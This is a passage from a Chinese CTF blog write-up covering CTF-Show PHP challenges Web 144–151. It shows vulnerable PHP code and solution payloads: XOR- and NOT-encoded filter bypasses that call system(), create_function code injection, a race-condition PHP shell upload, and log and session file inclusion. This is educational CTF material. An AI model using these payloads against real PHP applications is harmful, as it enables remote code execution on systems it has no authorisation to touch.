&#125;    &#125;&#125;<span class="keyword">function</span> check(<span class="variable">$str</span>)&#123;    <span class="built_in">return</span> strlen(<span class="variable">$str</span>)===1?<span class="literal">true</span>:<span class="literal">false</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload ?v1=1&amp;v3=%2f(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%01%06%02&quot;^&quot;%7f%60%60%21%60%28&quot;);&amp;v2=1# / 这次竟然 火绒没有拦截?v1=1&amp;v2=%00*(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%01%06%02&quot;^&quot;%7f%60%60%21%60%28&quot;);&amp;v3=1# %00*?v1=1&amp;v2=^(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%01%06%02&quot;^&quot;%7f%60%60%21%60%28&quot;);&amp;v3=1# ^</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="1-46-Web-145-—-144-plus"><a href="#1-46-Web-145-—-144-plus" class="headerlink" title="1.46 Web 145 — 144 plus"></a>1.46 Web 145 — 144 plus</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">144的plus版本</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phphighlight_file(__FILE__);<span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; isset(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; isset(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;    <span class="variable">$v1</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];    <span class="variable">$v2</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];    <span class="variable">$v3</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];    <span class="keyword">if</span>(is_numeric(<span class="variable">$v1</span>) &amp;&amp; is_numeric(<span class="variable">$v2</span>))&#123;        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[a-z]|[0-9]|\@|\!|\+|\-|\.|\_|\$|\&#125;|\%|\&amp;|\;|\&lt;|\&gt;|\*|\/|\^|\#|\&quot;/i&#x27;</span>, <span class="variable">$v3</span>))&#123;                die(<span class="string">&#x27;get out hacker!&#x27;</span>);        &#125;        <span class="keyword">else</span>&#123;            <span class="variable">$code</span> =  <span class="built_in">eval</span>(<span class="string">&quot;return $v1$v3<span class="variable">$v2</span>;&quot;</span>);            <span class="built_in">echo</span> <span class="string">&quot;$v1$v3<span class="variable">$v2</span> = &quot;</span>.<span class="variable">$code</span>;        &#125;    &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>过滤了 <code>;  ^  &lt;   &quot;   &gt;  </code> 和我们能用到的运算符</li>
+<li>使用 <code>|   ?</code>    绕过</li>
+</ul>
+<p><strong>~ 脚本</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php//在命令行中运行/*author yu22x*/fwrite(STDOUT,<span class="string">&#x27;[+]your function: &#x27;</span>);<span class="variable">$system</span>=str_replace(array(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, fgets(STDIN)); fwrite(STDOUT,<span class="string">&#x27;[+]your command: &#x27;</span>);<span class="variable">$command</span>=str_replace(array(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, fgets(STDIN)); <span class="built_in">echo</span> <span class="string">&#x27;[*] (~&#x27;</span>.urlencode(~<span class="variable">$system</span>).<span class="string">&#x27;)(~&#x27;</span>.urlencode(~<span class="variable">$command</span>).<span class="string">&#x27;);&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p><strong>三目运算符</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">&quot;return 1?phpinfo():1;&quot;</span>);	<span class="comment">#可行</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload ?v1=1&amp;v3=?(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5):&amp;v2=1</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="1-47-Web-146-—-145-plus"><a href="#1-47-Web-146-—-145-plus" class="headerlink" title="1.47 Web 146 — 145 plus"></a>1.47 Web 146 — 145 plus</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">145的plus版本</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phphighlight_file(__FILE__);<span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; isset(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; isset(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;    <span class="variable">$v1</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];    <span class="variable">$v2</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];    <span class="variable">$v3</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];    <span class="keyword">if</span>(is_numeric(<span class="variable">$v1</span>) &amp;&amp; is_numeric(<span class="variable">$v2</span>))&#123;        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[a-z]|[0-9]|\@|\!|\:|\+|\-|\.|\_|\$|\&#125;|\%|\&amp;|\;|\&lt;|\&gt;|\*|\/|\^|\#|\&quot;/i&#x27;</span>, <span class="variable">$v3</span>))&#123;                die(<span class="string">&#x27;get out hacker!&#x27;</span>);        &#125;        <span class="keyword">else</span>&#123;            <span class="variable">$code</span> =  <span class="built_in">eval</span>(<span class="string">&quot;return $v1$v3<span class="variable">$v2</span>;&quot;</span>);            <span class="built_in">echo</span> <span class="string">&quot;$v1$v3<span class="variable">$v2</span> = &quot;</span>.<span class="variable">$code</span>;        &#125;    &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>过滤了 <code>:</code></li>
+<li>不能使用三目运算符了</li>
+</ul>
+<p><strong>测试</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phphighlight_file(__FILE__);// <span class="built_in">eval</span>(<span class="string">&quot;return 1==phpinfo()||1;&quot;</span>);	<span class="comment">#可行// eval(&quot;return 1==phpinfo()|1;&quot;);	#可行// eval(&quot;return 1===phpinfo()|1;&quot;);	#可行// eval(&quot;return 1===phpinfo()||1;&quot;);	#可行 eval(&quot;return 1=phpinfo()||1;&quot;);		#不可行//eval(&quot;return 1=phpinfo()||1;&quot;);		#不可行</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># payload?v1=1&amp;v3===(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5)|&amp;v2=1</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="1-48-Web-147-—-create-function-命令注入"><a href="#1-48-Web-147-—-create-function-命令注入" class="headerlink" title="1.48 Web 147 — create_function 命令注入"></a>1.48 Web 147 — create_function 命令注入</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phphighlight_file(__FILE__);<span class="keyword">if</span>(isset(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>]))&#123;    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>];    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/^[a-z0-9_]*$/isD&#x27;</span>,<span class="variable">$ctfshow</span>)) &#123;        <span class="variable">$ctfshow</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;show&#x27;</span>]);    &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://my.oschina.net/huyex/blog/2885273">create_function()</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create_function(&#x27;$a&#x27;,&#x27;echo $a.&quot;123&quot;&#x27;)类似于function f($a) &#123;  echo $a.&quot;123&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>那么如果我们第二个参数传入 <strong>echo 1;}phpinfo();/</strong>/<br>就等价于</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function f($a) &#123;  echo 1;&#125;phpinfo();//&#125;从而执行phpinfo()命令</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># payloadGET ?show=2;&#125;system(&quot;tac f*&quot;);/*POST ctf=\create_function# \ %5c</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/08/05/Rftu7sEcSJiKqbM.png" alt="image-20210805185639951"></p>
+<h2 id="1-49-Web-148-—-中文变量"><a href="#1-49-Web-148-—-中文变量" class="headerlink" title="1.49 Web 148 — 中文变量"></a>1.49 Web 148 — 中文变量</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phpinclude <span class="string">&#x27;flag.php&#x27;</span>;<span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;    <span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[A-Za-z0-9_\%\\|\~\&#x27;\,\.\:\@\&amp;\*\+\- ]+/&quot;</span>,<span class="variable">$code</span>))&#123;        die(<span class="string">&quot;error&quot;</span>);    &#125;    @<span class="built_in">eval</span>(<span class="variable">$code</span>);&#125;<span class="keyword">else</span>&#123;    highlight_file(__FILE__);&#125;<span class="keyword">function</span> <span class="function"><span class="title">get_ctfshow_fl0g</span></span>()&#123;    <span class="built_in">echo</span> file_get_contents(<span class="string">&quot;flag.php&quot;</span>);&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>未过滤 <code>^   ;</code>    ，可直接异或构造</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># payload?code=(&quot;%08%02%08%09%05%0d&quot;^&quot;%7b%7b%7b%7d%60%60&quot;)(&quot;%09%01%03%01%06%02&quot;^&quot;%7d%60%60%21%60%28&quot;);</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>利用中文变量</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=$哈=<span class="string">&quot;`&#123;&#123;&#123;&quot;</span>^<span class="string">&quot;?&lt;&gt;/&quot;</span>;<span class="variable">$&#123;$哈&#125;</span>[哼](<span class="variable">$&#123;$哈&#125;</span>[嗯]);&amp;哼=system&amp;嗯=tac f*其实也是利用异或构造<span class="string">&quot;`&#123;&#123;&#123;&quot;</span>^<span class="string">&quot;?&lt;&gt;/&quot;</span>; 异或出来的结果是 _GET</span><br></pre></td></tr></table></figure>
+
+<h2 id="1-50-Web-149-—-条件竞争"><a href="#1-50-Web-149-—-条件竞争" class="headerlink" title="1.50 Web 149 — 条件竞争"></a>1.50 Web 149 — 条件竞争</h2> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phperror_reporting(0);highlight_file(__FILE__);<span class="variable">$files</span> = scandir(<span class="string">&#x27;./&#x27;</span>); foreach(<span class="variable">$files</span> as <span class="variable">$file</span>) &#123;    <span class="keyword">if</span>(is_file(<span class="variable">$file</span>))&#123;        <span class="keyword">if</span> (<span class="variable">$file</span> !== <span class="string">&quot;index.php&quot;</span>) &#123;            unlink(<span class="variable">$file</span>);        &#125;    &#125;&#125;file_put_contents(<span class="variable">$_GET</span>[<span class="string">&#x27;ctf&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;show&#x27;</span>]);<span class="variable">$files</span> = scandir(<span class="string">&#x27;./&#x27;</span>); foreach(<span class="variable">$files</span> as <span class="variable">$file</span>) &#123;    <span class="keyword">if</span>(is_file(<span class="variable">$file</span>))&#123;        <span class="keyword">if</span> (<span class="variable">$file</span> !== <span class="string">&quot;index.php&quot;</span>) &#123;            unlink(<span class="variable">$file</span>);        &#125;    &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>分析：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在每次 写文件之前之后，都会删除 除了 index.php 之外的任何文件</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>解一：直接在 index.php 当中写入代码</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 总是成功不了</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>解二：条件竞争</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1. 写入 ?ctf=1.phpshow=&lt;?php system(<span class="string">&#x27;ls /&#x27;</span>); ?&gt;2. 访问 /1.php3. 二者同时进行爆破</span><br></pre></td></tr></table></figure>
+
+<h2 id="1-51-Web-150-—"><a href="#1-51-Web-150-—" class="headerlink" title="1.51 Web 150 —"></a>1.51 Web 150 —</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">对我们以前的内容进行了小结，我们文件上传系列再见！</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phpinclude(<span class="string">&quot;flag.php&quot;</span>);error_reporting(0);highlight_file(__FILE__);class CTFSHOW&#123;    private <span class="variable">$username</span>;    private <span class="variable">$password</span>;    private <span class="variable">$vip</span>;    private <span class="variable">$secret</span>;    <span class="keyword">function</span> <span class="function"><span class="title">__construct</span></span>()&#123;        <span class="variable">$this</span>-&gt;vip = 0;        <span class="variable">$this</span>-&gt;secret = <span class="variable">$flag</span>;    &#125;    <span class="keyword">function</span> <span class="function"><span class="title">__destruct</span></span>()&#123;        <span class="built_in">echo</span> <span class="variable">$this</span>-&gt;secret;    &#125;    public <span class="keyword">function</span> <span class="function"><span class="title">isVIP</span></span>()&#123;        <span class="built_in">return</span> <span class="variable">$this</span>-&gt;vip?TRUE:FALSE;        &#125;    &#125;    <span class="keyword">function</span> __autoload(<span class="variable">$class</span>)&#123;        <span class="keyword">if</span>(isset(<span class="variable">$class</span>))&#123;            <span class="variable">$class</span>();    &#125;&#125;<span class="comment">#过滤字符$key = $_SERVER[&#x27;QUERY_STRING&#x27;];if(preg_match(&#x27;/\_| |\[|\]|\?/&#x27;, $key))&#123;    die(&quot;error&quot;);&#125;$ctf = $_POST[&#x27;ctf&#x27;];extract($_GET);if(class_exists($__CTFSHOW__))&#123;    echo &quot;class is exists!&quot;;&#125;if($isVIP &amp;&amp; strrpos($ctf, &quot;:&quot;)===FALSE)&#123;    include($ctf);&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>分析：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$isVIP</span> &amp;&amp; strrpos(<span class="variable">$ctf</span>, <span class="string">&quot;:&quot;</span>)===FALSE)&#123;    include(<span class="variable">$ctf</span>);&#125;<span class="comment"># 1.使 $isVIP = 1# 2.$ctf 中不能包含 :</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>写入日志</strong></p>
+<p><img src="https://i.loli.net/2021/08/05/6HVGre1oWQunET9.png" alt="image-20210805210149883"></p>
+<p><strong>日志包含</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?isVIP=1ctf=/var/<span class="built_in">log</span>/nginx/access.log&amp;a=system(<span class="string">&#x27;ls&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/08/05/8RlGgSM6mD7PArW.png" alt="image-20210805210055518"></p>
+<h2 id="1-52-Web-151-—"><a href="#1-52-Web-151-—" class="headerlink" title="1.52 Web 151 —"></a>1.52 Web 151 —</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">修复了非预期</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phpinclude(<span class="string">&quot;flag.php&quot;</span>);error_reporting(0);highlight_file(__FILE__);class CTFSHOW&#123;    private <span class="variable">$username</span>;    private <span class="variable">$password</span>;    private <span class="variable">$vip</span>;    private <span class="variable">$secret</span>;    <span class="keyword">function</span> <span class="function"><span class="title">__construct</span></span>()&#123;        <span class="variable">$this</span>-&gt;vip = 0;        <span class="variable">$this</span>-&gt;secret = <span class="variable">$flag</span>;    &#125;    <span class="keyword">function</span> <span class="function"><span class="title">__destruct</span></span>()&#123;        <span class="built_in">echo</span> <span class="variable">$this</span>-&gt;secret;    &#125;    public <span class="keyword">function</span> <span class="function"><span class="title">isVIP</span></span>()&#123;        <span class="built_in">return</span> <span class="variable">$this</span>-&gt;vip?TRUE:FALSE;        &#125;    &#125;    <span class="keyword">function</span> __autoload(<span class="variable">$class</span>)&#123;        <span class="keyword">if</span>(isset(<span class="variable">$class</span>))&#123;            <span class="variable">$class</span>();    &#125;&#125;<span class="comment">#过滤字符$key = $_SERVER[&#x27;QUERY_STRING&#x27;];if(preg_match(&#x27;/\_| |\[|\]|\?/&#x27;, $key))&#123;    die(&quot;error&quot;);&#125;$ctf = $_POST[&#x27;ctf&#x27;];extract($_GET);if(class_exists($__CTFSHOW__))&#123;    echo &quot;class is exists!&quot;;&#125;if($isVIP &amp;&amp; strrpos($ctf, &quot;:&quot;)===FALSE &amp;&amp; strrpos($ctf,&quot;log&quot;)===FALSE)&#123;    include($ctf);&#125;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>过滤了 <code>log</code></li>
+</ul>
+<p><strong>sess 文件包含</strong></p>
+<p><img src="https://i.loli.net/2021/08/05/UsBeVuF4M6XJv7j.png" alt="image-20210805213534877"></p>
+<p><img src="https://i.loli.net/2021/08/05/vNDO6bQoxqiZwmL.png" alt="image-20210805213509559"></p>
+<p><img src="https://i.loli.net/2021/08/05/q21uFEU9YCBRcQ3.png" alt="image-20210805213448223"></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/109181768">https://blog.csdn.net/miuzzx/article/details/109181768</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <div id="donation_div"></div>
+
+
+<script src="/js/vdonate.js"></script>
+
+<script>
+var a = new Donate({
+  title: '如果觉得我的文章对您有用，请随意打赏。您的支持将鼓励我继续创作!', // 可选参数，打赏标题
+  btnText: 'Donate', // 可选参数，打赏按钮文字
+  el: document.getElementById('donation_div'),
+  wechatImage: 'https://i.loli.net/2021/07/09/UNXc5a6nbWxgzru.png',
+  alipayImage: 'https://i.loli.net/2021/07/09/Sf9nJd8hkOypTar.png'
+});
+</script>
+      
+      
+      <div>
+        <ul class="post-copyright">
+          <li class="post-copyright-author">
+          <strong>Post author:  </strong>xizhi-future</a>
+          </li>
+          <li class="post-copyright-link">
+          <strong>Post link:  </strong>
+          <a href="/2021/10/01/CTF-Show-PHP特性/" target="_blank" title="CTF-Show-PHP特性">https://xizhi-future.github.io/2021/10/01/CTF-Show-PHP特性/</a>
+          </li>
+          <li class="post-copyright-license">
+            <strong>Copyright Notice:   </strong>
+            All articles in this blog are licensed under <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">CC BY-NC-ND 4.0</a>
+            unless stating additionally.
+          </li>
+         
+        </ul>
+<div>
+
+      
+      
+        
+	<div id="comment">
+		<!-- 来必力City版安装代码 -->
+		<div id="lv-container" data-id="city" data-uid="MTAyMC8yOTQ4MS82MDQ5">
+		<script type="text/javascript">
+		   (function(d, s) {
+		       var j, e = d.getElementsByTagName(s)[0];
+
+		       if (typeof LivereTower === 'function') { return; }
+
+		       j = d.createElement(s);
+		       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+		       j.async = true;
+
+		       e.parentNode.insertBefore(j, e);
+		   })(document, 'script');
+		</script>
+		<noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
+		</div>
+		<!-- City版安装代码已完成 -->
+	</div>
+
+
+
+      
+      
+        
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>
+
+      
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2021/10/01/CTF-Show-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          CTF-Show-文件上传
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2021/10/01/CTF-Show-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">CTF-Show-命令执行</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+<!-- Table of Contents -->
+
+  <aside id="toc-sidebar">
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">Contents</strong>
+    
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%80%E3%80%81CTF-Show-PHP%E7%89%B9%E6%80%A7"><span class="nav-number">1.</span> <span class="nav-text">一、CTF Show PHP特性</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-1-Web-89-%E2%80%94-intval-%E6%95%B0%E7%BB%84-%E7%BB%95%E8%BF%87"><span class="nav-number">1.1.</span> <span class="nav-text">1.1 Web 89 — intval 数组 [ ] 绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-2-Web-90-%E2%80%94-intval-%E5%8F%96%E6%95%B4-%E2%80%94-intval-%E2%80%984476sasaS%E2%80%99-0-4476"><span class="nav-number">1.2.</span> <span class="nav-text">1.2 Web 90 — intval 取整 — intval(‘4476sasaS’,0)&#x3D;&#x3D;&#x3D;4476</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-3-Web-91-%E2%80%94-%E6%AD%A3%E5%88%99%E7%BB%95%E8%BF%87-%E2%80%94-m-%E6%8D%A2%E8%A1%8C%E5%8C%B9%E9%85%8D"><span class="nav-number">1.3.</span> <span class="nav-text">1.3 Web 91 — 正则绕过 — &#x2F;m 换行匹配</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-4-Web-92-%E2%80%94-intval-%E5%8F%AF%E8%A7%A3%E6%9E%90%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E3%80%81%E5%85%AB%E8%BF%9B%E5%88%B6"><span class="nav-number">1.4.</span> <span class="nav-text">1.4 Web 92 — intval 可解析十六进制、八进制</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-5-Web-93-%E2%80%94-%E5%85%AB%E8%BF%9B%E5%88%B6%E4%B8%8D%E5%90%AB%E5%AD%97%E6%AF%8D%EF%BC%8C%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E5%90%AB%E5%AD%97%E6%AF%8D"><span class="nav-number">1.5.</span> <span class="nav-text">1.5 Web 93 — 八进制不含字母，十六进制含字母</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-6-Web-94-%E2%80%94-%E6%AD%A3%E5%88%99%E7%BB%95%E8%BF%87-%E2%80%94-20-0a"><span class="nav-number">1.6.</span> <span class="nav-text">1.6 Web 94 — 正则绕过 — %20  %0a</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-7-Web-95-%E2%80%94-%E6%AD%A3%E5%88%99%E7%BB%95%E8%BF%87"><span class="nav-number">1.7.</span> <span class="nav-text">1.7 Web 95 — 正则绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-8-Web-96-%E2%80%94-%E8%B7%AF%E5%BE%84%E4%B9%A6%E5%86%99"><span class="nav-number">1.8.</span> <span class="nav-text">1.8 Web 96 — 路径书写</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-9-Web-97-%E2%80%94-md5-%E6%95%B0%E7%BB%84-%E7%BB%95%E8%BF%87-%E2%80%94-if-POST-39-a-39-POST-39-b-39-amp-amp-md5-POST-39-a-39-md5-POST-39-b-39"><span class="nav-number">1.9.</span> <span class="nav-text">1.9 Web 97 — md5 数组 [ ] 绕过 — if ($_POST[&#39;a&#39;] !&#x3D; $_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) &#x3D;&#x3D;&#x3D; md5($_POST[&#39;b&#39;]))</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-10-Web-98-%E2%80%94-%E4%B8%89%E7%9B%AE%E8%BF%90%E7%AE%97%E7%AC%A6%E3%80%81%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96"><span class="nav-number">1.10.</span> <span class="nav-text">1.10 Web 98 — 三目运算符、变量覆盖</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-11-Web-99-%E2%80%94-file-put-contents"><span class="nav-number">1.11.</span> <span class="nav-text">1.11 Web 99 — file_put_contents</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-12-Web-100-%E2%80%94-eval-%E2%80%9C-v2-%E2%80%98ctfshow%E2%80%99-v3%E2%80%9D"><span class="nav-number">1.12.</span> <span class="nav-text">1.12 Web 100 — eval(“$v2(‘ctfshow’)$v3”);</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-13-Web-101-%E2%80%94-ReflectionClass-%E5%85%B3%E4%BA%8E%E4%B8%80%E4%B8%AA%E7%B1%BB%E7%9A%84%E5%8F%8D%E5%B0%84"><span class="nav-number">1.13.</span> <span class="nav-text">1.13 Web 101 — ReflectionClass 关于一个类的反射</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-14-Web-102"><span class="nav-number">1.14.</span> <span class="nav-text">1.14 Web 102</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-15-Web-103"><span class="nav-number">1.15.</span> <span class="nav-text">1.15 Web 103</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-16-Web-104-%E2%80%94-shal-%E6%95%B0%E7%BB%84-%E7%BB%95%E8%BF%87"><span class="nav-number">1.16.</span> <span class="nav-text">1.16 Web 104 — shal() 数组 [ ] 绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-17-Web-105-%E2%80%94-%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96"><span class="nav-number">1.17.</span> <span class="nav-text">1.17 Web 105 — 变量覆盖</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-15-Web-106-%E2%80%94-shal-%E6%95%B0%E7%BB%84-%E7%BB%95%E8%BF%87"><span class="nav-number">1.18.</span> <span class="nav-text">1.15 Web 106 — shal() 数组 [ ] 绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-16-Web-107-%E2%80%94-parse-str"><span class="nav-number">1.19.</span> <span class="nav-text">1.16 Web 107 — parse_str()</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-17-Web-108-%E2%80%94-ereg-%E6%88%AA%E6%96%AD%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.20.</span> <span class="nav-text">1.17 Web 108 — ereg() 截断漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-18-Web-109-%E2%80%94-v1-v2-%E5%86%85%E7%BD%AE%E7%B1%BB"><span class="nav-number">1.21.</span> <span class="nav-text">1.18 Web 109 — $v1($v2()) 内置类</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" 